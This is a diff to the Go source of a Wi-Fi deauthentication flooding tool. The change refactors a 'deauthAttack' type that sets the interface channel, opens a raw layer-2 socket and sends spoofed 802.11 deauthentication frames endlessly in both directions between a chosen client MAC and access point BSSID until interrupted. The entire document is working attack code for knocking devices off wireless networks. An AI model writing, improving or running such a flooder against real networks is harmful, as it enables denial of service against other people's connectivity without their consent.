@@ -31,78 +31,69 @@ import (
 
 
 func Run(args []string) {
-    newDeauth(args).execute()
+    da := deauthAttack{}
+    da.parseArgs(args)
+    da.execute()
 }
 
 
 
-type deauthentication struct {
-    builder     dot11build.Deauth
-    frmsSent    int
-    seqNum      uint16
-    socket      sockets.Layer2Socket
-    apMac       net.HardwareAddr
-    targetMac   net.HardwareAddr
-    delay       time.Duration
+type deauthAttack struct {
+    iface      net.Interface
+    channel    int
+    builder    dot11build.Deauth
+    frmsSent   int
+    seqNum     uint16
+    socket     sockets.Layer2Socket
+    apMAC      net.HardwareAddr
+    targetMAC  net.HardwareAddr
+    delay      time.Duration
+    timeStart  time.Time
 }
 
 
 
-func newDeauth(argList []string) *deauthentication {
-    parser := newParser()
-    parser.parseDeauthArgs(argList)
-    
-    sysconf.MustSetChannel(parser.iface, parser.channel)
-    displayInfo(parser)
-
-    builder := dot11build.NewDeauthFrame()
-    builder.SetBSSID(parser.bssid)
-
-    return &deauthentication{
-        builder   : builder,
-        frmsSent  : 0,
-        seqNum    : 1,
-        socket    : sockets.NewL2Socket(&parser.iface),
-        targetMac : parser.targetMac,
-        apMac     : parser.bssid,
-        delay     : time.Duration(parser.delay) * time.Millisecond,
-    }
+func (da *deauthAttack) execute() {
+    sysconf.MustSetChannel(da.iface, da.channel)
+    da.displayInfo()
+    da.sendEndlessly()
+    da.displayExecInfo()
+    da.closeSocket()
 }
 
 
 
-func displayInfo(args *deauthParser) {
-    fmt.Printf("[i] IFACE...: %s\n", args.iface.Name)
-    fmt.Printf("[i] BSSID...: %s\n", args.bssid.String())
-    fmt.Printf("[i] TARGET..: %s\n", args.targetMac.String())
-    fmt.Printf("[i] CHANNEL.: %d\n", args.channel)
+func (da *deauthAttack) displayInfo() {
+    fmt.Printf("[i] IFACE...: %s\n", da.iface.Name)
+    fmt.Printf("[i] BSSID...: %s\n", da.apMAC.String())
+    fmt.Printf("[i] TARGET..: %s\n", da.targetMAC.String())
+    fmt.Printf("[i] CHANNEL.: %d\n", da.channel)
 }
 
 
 
-func (d *deauthentication) execute() {
-    ctx := utils.SignalContext()
+func (da *deauthAttack) sendEndlessly() {
+    ctx   := utils.SignalContext()
+    shots := 0
+
+    da.builder.SetBSSID(da.apMAC)
 
     fmt.Println("[+] Sending frames. Press Ctrl + C to stop")
-    start := time.Now()
-    shots := 0
+    da.timeStart = time.Now()
 
     for {
         select {
         case <-ctx.Done():
-            elapsed := time.Since(start).Seconds()
-            d.closeSocket()
-            d.displayExecInfo(elapsed)
             return
 
         default:
-            d.sendFrame(d.targetMac, d.apMac)
-            d.sendFrame(d.apMac, d.targetMac)
+            da.sendFrame(da.targetMAC, da.apMAC)
+            da.sendFrame(da.apMAC, da.targetMAC)
             shots += 2
 
             if shots >= 128 {
                 shots = 0
-                time.Sleep(d.delay)
+                time.Sleep(da.delay)
             }
         }
     }
@@ -110,38 +101,39 @@ func (d *deauthentication) execute() {
 
 
 
-func (d *deauthentication) sendFrame(srcMac, dstMac net.HardwareAddr) {
-    d.builder.SetSrcAddr(srcMac)
-    d.builder.SetDstAddr(dstMac)
-    d.builder.SetSeqCtrl(d.seqNum)
+func (da *deauthAttack) sendFrame(srcMac, dstMac net.HardwareAddr) {
+    da.builder.SetSrcAddr(srcMac)
+    da.builder.SetDstAddr(dstMac)
+    da.builder.SetSeqCtrl(da.seqNum)
     
-    frame := d.builder.Frame()
-    d.socket.Send(frame)
+    frame := da.builder.Frame()
+    da.socket.Send(frame)
     
-	d.updateSeqNum()
-    d.frmsSent++
+	da.updateSeqNum()
+    da.frmsSent++
 }
 
 
 
-func (d *deauthentication) updateSeqNum() {
-    if d.seqNum >= 4095 {
-        d.seqNum = 0
+func (da *deauthAttack) updateSeqNum() {
+    if da.seqNum >= 4095 {
+        da.seqNum = 0
     }
-    d.seqNum++
+    da.seqNum++
 }
 
 
 
-func (d *deauthentication) displayExecInfo(elapsed float64) {
+func (da *deauthAttack) displayExecInfo() {
+    elapsed := time.Since(da.timeStart).Seconds()
     fmt.Printf("\n[-] Flood interrupted\n")
-    fmt.Printf("[%%] Frames sent: %d in %.2f s\n", d.frmsSent, elapsed)
+    fmt.Printf("[%%] Frames sent: %d in %.2f s\n", da.frmsSent, elapsed)
 }
 
 
 
-func (d *deauthentication) closeSocket() {
-    if err := d.socket.Close(); err != nil {
+func (da *deauthAttack) closeSocket() {
+    if err := da.socket.Close(); err != nil {
         fmt.Printf("[!] Error closing socket: %v\n", err)
     }
 }
